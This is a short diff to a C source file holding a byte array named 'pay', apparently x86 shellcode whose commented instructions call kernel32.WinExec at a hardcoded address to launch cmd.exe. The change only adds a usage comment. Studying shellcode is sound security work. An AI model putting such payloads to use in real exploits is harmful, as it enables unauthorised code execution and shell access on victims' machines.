@@ -25,7 +25,7 @@ unsigned char pay[]{
 	0x8b, 0xc4,						            // MOV EAX, ESP 
 	0x6a, 0x01,						            // PUSH 1  
 	0x50,				                			// PUSH EAX 
-	0xbb, 0x30, 0xcd, 0x5d, 0x77,	    // MOV EBX, kernel32.WinExec 775dcd30
+	0xbb, 0x30, 0xcd, 0x5d, 0x77,	    // MOV EBX, kernel32.WinExec 775dcd30  || Ex use: WinExec("cmd.exe", 1);
 	0xff, 0xd3						            // CALL EBX 
 };
 
